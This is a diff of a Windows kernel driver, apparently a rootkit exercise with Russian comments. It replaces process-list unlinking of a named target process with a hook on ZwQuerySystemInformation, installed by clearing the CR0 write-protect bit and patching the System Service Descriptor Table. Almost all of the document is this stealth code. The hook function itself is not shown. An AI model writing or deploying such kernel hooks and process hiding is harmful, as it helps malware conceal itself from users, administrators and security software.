@@ -26,7 +26,8 @@ extern SHORT *NtBuildNumber;
 NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath);
 NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject);
 
-
+VOID InsertAllHook(VOID);
+VOID RemoveAllHook(VOID);
 
 //*************************************************************
 // описание функций
@@ -45,32 +46,22 @@ NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING Registry
 	//DbgBreakPoint();
 	switch(*NtBuildNumber){
 		case WINXP_BUILD_NUMBER:
-			INIT_OFFSETS_WINXP();
+			INIT_VARIABLES(WINXP);
+			//INIT_OFFSETS_WINXP();
 			break;
 		case WIN7_BUILD_NUMBER:
 			DbgPrint("Win7\n");
-			INIT_OFFSETS_WIN7();
+			INIT_VARIABLES(WIN7);
 			break;
 		case WIN8_BUILD_NUMBER:
 			DbgPrint("Win8\n");
-			INIT_OFFSETS_WIN8();
+			//INIT_VARIABLES(WIN8_1);
 			break;
 		default:
 			return STATUS_UNSUCCESSFUL;
 	}
 
-
-
-    // получаем указатель на заголовок списка всех процессов
-    PsActiveProcessHead = (GET_ENTRY_PROCESS_LIST(PsGetCurrentProcess()))->Blink;
-	PsActiveHandleTableHead = (GET_HANDLE_TABLE_LIST_ENTRY(*(GET_HANDLE_TABLE(PsGetCurrentProcess()))))->Blink;
-
-	DeleteFromProcessListByName(TARGET_NAME);
-	//DeleteFromProcessListByPid(TARGET_PID);
-    // выводим информацию о потоках всех процессов
-    ShowAllProcess();
-	//DbgPrint("%hu\n", *NtBuildNumber);
-	
+	InsertAllHook();
 
     return status;
 }
@@ -80,10 +71,46 @@ NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject){
 	DbgPrint("Driver unload\n");
 	
 	//DbgBreakPoint();
-	InsertProcessEntry();
+	//InsertProcessEntry();
 	
+	RemoveAllHook();
+
 	return STATUS_SUCCESS;
-} 
+}
+
+
+VOID InsertAllHook(VOID) {
+	
+	ULONG reg;
+
+	reg = ClearWP();
+
+	// BASE TASK 0
+	glRealNtQuerySystemInformation =
+		(ZW_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]];
+
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)HookZwQuerySystemInformation;
+	
+	
+	WriteCR0(reg);
+
+}
+
+VOID RemoveAllHook(VOID) {
+	
+	ULONG reg;
+
+	reg = ClearWP();
+
+	// BASE TASK 0
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)glRealNtQuerySystemInformation;
+	
+
+	WriteCR0(reg);
+
+	WaitVar(&glHookCount);
+}
+
 
 
 
